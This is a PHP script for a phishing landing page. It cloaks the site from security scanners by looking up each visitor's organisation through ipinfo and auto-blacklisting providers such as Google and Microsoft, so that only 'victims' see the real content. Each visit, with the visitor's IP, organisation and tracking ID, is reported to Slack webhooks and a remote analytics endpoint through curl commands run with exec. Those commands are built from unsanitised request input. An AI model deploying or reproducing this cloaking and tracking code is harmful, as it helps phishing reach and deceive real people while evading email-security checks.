<?php

//AutoBlock Mode "true" means every IP but yours will get auto-added to the blacklist
// "false" means everyone is allowed except if they're on the blacklist
$AutoBlock = true;
// Your public IP (your client)        ************** MAKE SURE YOU SET THIS ****************
$myip = "YOUR_IP_HERE";
// Set your expected URL here (ie https://phishu.net) in case you use a subdomain
$lpurl = "https://YOUR_DOMAIN_HERE";

// I recommend registering at ipinfo to hit the API a lot, in case of large traffic volumes
$ipinfoToken = "YOUR_IPINFO_TOKEN_HERE";

// Gets URI that's accessed
$url = (empty($_SERVER['HTTPS']) ? 'http' : 'https') . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";
$blocked = 0;
$url = rtrim($url, '/');

// See if requested URI is a match
if (strpos($url, $lpurl) !== false) {
    $URLMatch = 1;
} else {$URLMatch = 0;}


// Determines if the URI is an IP or Domain (blocks if IP)
$parts = parse_url($url);
$isIP = (bool)ip2long($parts['host']);

$allowed = "- *Accessed Phishing Site* -";

// This section of code doesn't allow Gmail or Microsoft to inspect links to avoid blacklisting
$ip = $_SERVER['REMOTE_ADDR'];

// Can set your IP manually to see what Google sees
//$ip = "8.8.8.8";
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json?token={$ipinfoToken}"));
$org = $details->org;

// List of Orgs to be Blacklisted
$filename = "/var/www/html/blacklist.txt";

// Open the file
$fp = @fopen($filename, 'r'); 

// Add each line to an array
if ($fp) {
   $blockorgs = explode("\r\n", fread($fp, filesize($filename)));
}

// AutoBlock Function
if ($AutoBlock == true && $ip != $myip && $isIP == false){
$txt = explode(' ', $org, 2)[1];

if(!in_array($txt, $blockorgs)){
	
$myfile = fopen("/var/www/html/blacklist.txt", "a") or die("Unable to open file!");
fwrite($myfile, "\r\n". $txt);
fclose($myfile);
array_push($blockorgs, $txt);
$blocked = 1;
}
}else{$blocked = 2;}

//Block via blacklist
if( preg_match("(".implode("|",array_map("preg_quote",$blockorgs)).")",$org,$m) OR $isIP == true && $ip != $myip OR $org == "" OR $URLMatch == 0) {

if($isIP == true OR $URLMatch == 0){
$blocked = 3;	
}

// Respond With 404 Instead of Image. More Likely to Fool URL Checkers
//header('HTTP/1.0 404 not found'); 
  
$allowed = "- *Jedi Mind Trick Successful* -";

} else {

// Content for victims to see (not on the blacklist)
// Point this to file containing HTML you want the victims to see
$realhtml = file_get_contents('/var/www/html/realcontent.php');
echo $realhtml;

$allowed = "- *Allowed* -";
}

if($allowed == "- *Jedi Mind Trick Successful* -"){$jedi = 1;}else{$jedi = 0;}

// Slack Message
if(isset($_REQUEST['id'])){
$id = $_REQUEST['id'];

// Send Slack Notification
$message = ">".$url." was visited by ".$id." from ".$ip.". ".$allowed." (`".$org."`)";
} else {
$id = "";
$message = ">".$url." was visited by ".$ip.". ".$allowed." (`".$org."`)";
}

if($jedi == 1){
if($blocked == 1){
$message = $message." - Added to Blacklist";
}
if($blocked == 2){
$message = $message." - Blocked via Blacklist";
}
if($blocked == 3){
$message = $message." - Blocked via URL Mismatch";
}
}

// Don't alert slack when I visit the page
if($ip != $myip){

// Use a Slack webhook for a #blocked channel you can mute (first) and a #phishing one (second)
if($jedi == 1){$webhookurl = "https://hooks.slack.com/services/YOUR_SLACK_WEBHOOK_HERE"; $icon = ":no_entry:"; $channel = "#blocked";}else{$webhookurl = "https://hooks.slack.com/services/YOUR_SLACK_WEBHOOK_HERE"; $icon = ":fishing_pole_and_fish:"; $channel = "#phishing";}

// Set Slack Information Here       ************** MAKE SURE YOU SET THIS ****************
$cmd = 'curl -s -X POST --data-urlencode \'payload={"channel": "'.$channel.'", "username": "PhishBot", "text": "'.$message.'", "icon_emoji": "'.$icon.'"}\' '.$webhookurl;
//echo $cmd;
exec($cmd);

}

// Cleans up the status in the database and adds specifics
if($allowed == "- *Allowed* -"){$allowed = "Allowed";}else{
if($blocked == 1){
$allowed = "Blocked and Added to Blacklist";
}
if($blocked == 2){
$allowed = "Blocked via Blacklist";
}
if($blocked == 3){
$allowed = "Blocked via URL Mismatch";
}
}
// Send Analytics to API
$cmdanalytics = 'curl -s -k -X POST -d \'IP='.$ip.'&URL='.$url.'&Org='.$org.'&Status='.$allowed.'&ExtraID='.$id.'\' https://YOUR_API_DOMAIN_HERE/receiveanalytics.php';
//echo $cmdanalytics;
exec($cmdanalytics,$result);

?>


















